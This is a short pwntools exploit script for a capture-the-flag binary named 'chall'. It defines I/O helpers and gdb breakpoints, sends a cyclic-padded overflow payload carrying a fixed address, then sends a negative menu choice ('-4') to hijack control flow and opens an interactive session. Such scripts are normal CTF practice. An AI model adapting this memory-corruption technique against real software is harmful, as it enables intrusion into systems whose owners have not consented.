#!/usr/bin/env python3

from pwn import *

# requires bruteforces

exe = ELF('./chall')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

'''
cin
cin
be4 call rax
call rax
'''

script = '''
b *0x403018
b *0x40350F
b *0x40358B
b *0x403568
'''

p = process('./chall')
#p = gdb.debug('./chall', gdbscript = script)

payload = cyclic(40) + flat(0x4074a0, 100, 100)
payload = payload.ljust(0x100)
sla(b"name? > ", payload)

sla(b"Enter choice: ", b"-4")

p.interactive()
